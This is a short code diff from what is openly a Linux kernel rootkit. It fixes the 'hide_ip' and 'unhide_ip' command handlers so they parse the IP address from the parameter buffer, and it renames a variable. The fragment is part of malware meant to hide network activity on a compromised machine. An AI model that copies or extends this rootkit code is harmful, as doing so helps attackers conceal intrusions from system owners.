@@ -24,7 +24,7 @@ execute_command (void)
 {
 	int port;
 	pid_t pid;
-	__u32 ip;
+	__u32 ipaddr;
 	
 	u8 tmp[4];
 
@@ -95,7 +95,7 @@ execute_command (void)
 	} else if(strcmp(command_buffer, "hide_ip") == 0) {
 		if(param_counter > 0) {
 			/* convert ip string to an int array */
-			if(in4_pton(ipv4_addr, -1, tmp, -1, NULL) == 0) {
+			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0) {
 				ROOTKIT_DEBUG("[func 'hide_ip'] Not a valid IP address!\n");
 			}
 
@@ -115,7 +115,7 @@ execute_command (void)
 	} else if(strcmp(command_buffer, "unhide_ip") == 0) {
 		if(param_counter > 0) {
 			/* convert ip string to an int array */
-			if(in4_pton(ipv4_addr, -1, tmp, -1, NULL) == 0) {
+			if(in4_pton(param_buffer, -1, tmp, -1, NULL) == 0) {
 				ROOTKIT_DEBUG("[func 'unhide_ip'] Not a valid IP address!\n");
 			}
 
